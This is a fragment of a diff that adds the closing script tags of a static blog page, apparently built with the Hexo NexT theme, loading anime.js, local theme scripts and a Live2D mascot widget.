+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
